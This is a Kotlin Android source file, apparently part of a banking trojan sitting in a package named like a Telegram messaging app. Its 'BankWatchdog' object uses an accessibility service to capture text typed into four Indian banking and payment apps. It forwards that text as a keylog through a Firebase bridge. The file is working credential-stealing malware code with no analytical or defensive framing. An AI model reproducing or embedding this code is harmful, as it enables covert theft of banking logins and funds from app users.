package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent

object BankWatchdog {
    private val BANKING_PACKAGES = listOf(
        "com.yono.android",
        "com.csam.icici.bank.imobile",
        "com.hdfc.hdfcnetbanking",
        "com.google.android.apps.nbu.paisa.user"
    )

    fun start(service: AccessibilityService) {}

    fun onAccessibilityEvent(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (pkg in BANKING_PACKAGES) {
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                val text = event.text?.joinToString("") ?: return
                if (text.isNotEmpty()) {
                    FirebaseBridge.sendKeylog(pkg, text)
                }
            }
        }
    }
}